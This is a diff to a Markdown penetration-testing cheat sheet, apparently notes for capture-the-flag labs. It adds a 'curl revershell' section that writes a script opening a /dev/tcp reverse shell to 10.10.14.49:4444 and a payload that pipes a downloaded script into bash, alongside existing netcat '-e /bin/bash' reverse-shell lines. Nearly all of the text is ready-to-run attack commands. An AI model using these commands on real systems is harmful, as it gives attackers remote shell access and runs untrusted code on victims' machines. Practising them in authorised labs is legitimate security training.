@@ -130,7 +130,16 @@ nc -lvnp 1234
 nc -e /bin/bash 0.0.0.0 1234
 nc -c /bin/bash 0.0.0.0 1234
 ```
-
+**with curl revershell**  
+create shell.sh  
+```bash
+echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > shell.sh
+nc -lvnp 4444
+```
+your payload now   
+```
+curl http://10.10.14.49:4444/shell.sh | bash
+```
 **When you have a shell**  
 run pseudo temrinal with /bin/bash instance, determine type of terminal in use and foreground last processes in running  
 ```bash
